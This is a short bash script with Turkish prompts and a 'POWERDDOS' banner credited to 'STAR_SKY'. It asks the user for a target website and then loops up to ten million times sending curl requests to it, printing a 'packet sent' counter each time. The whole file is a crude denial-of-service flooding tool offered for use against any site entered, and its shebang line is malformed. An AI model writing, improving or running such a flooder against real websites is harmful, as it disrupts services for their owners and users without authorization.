#! bin/bash
clear
echo -e '\e[31m
░█▀█░█▀█░█░█░█▀▀░█▀▄░█▀▄░█▀▄░█▀█░█▀▀\e[37m
░█▀▀░█░█░█▄█░█▀▀░█▀▄░█░█░█░█░█░█░▀▀█
░▀░░░▀▀▀░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀░░▀▀▀░▀▀▀
'
sleep 1.1
echo -e '\e[34mSTAR_SKY TR'
echo			      
echo -e 'CODED BY STAR_SKY'
echo 
read -p $'\e[36mHEDEF SİTEYİ YAZINIZ (ÖRN=https://www.google.com) =}' hedefweb
				 
web=0

while [ $web -lt 10000000 ]; do
	echo -e '\e[31m'
	echo -e PAKET GÖNDERİLDİ = $web
	let web=web+1
	curl $hedefweb
done

